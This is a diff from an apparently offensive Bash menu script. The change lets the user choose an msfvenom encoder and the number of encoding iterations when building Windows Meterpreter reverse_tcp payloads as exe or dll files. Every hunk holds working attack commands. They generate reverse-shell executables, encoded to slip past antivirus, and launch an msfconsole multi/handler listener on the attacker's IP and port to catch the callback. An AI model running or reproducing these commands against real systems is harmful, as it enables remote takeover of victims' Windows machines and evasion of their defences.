@@ -10308,8 +10308,16 @@ while true; do
 			then
 				select EXT in "exe" "dll"
 				do
-					msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e x86/shikata_ga_nai -i 10 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
-					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+					select ENC in $(msfvenom -l | awk '{print $1}')
+					do
+						echo "Digit how many iterations of encoding"
+						read -p "(default, 10): " -i "10" ITE
+						if [[ "$ITE" != "" ]];
+						then
+							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
+							msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+						fi
+					done
 					break
 				done
 			fi
@@ -10326,8 +10334,16 @@ while true; do
 			then
 				select EXT in "exe" "dll"
 				do
-					msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
-					msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+					select ENC in $(msfvenom -l | awk '{print $1}')
+					do
+						echo "Digit how many iterations of encoding"
+						read -p "(default, 10): " -i "10" ITE
+						if [[ "$ITE" != "" ]];
+						then
+							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
+							msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
+						fi
+					done
 					break
 				done
 			fi
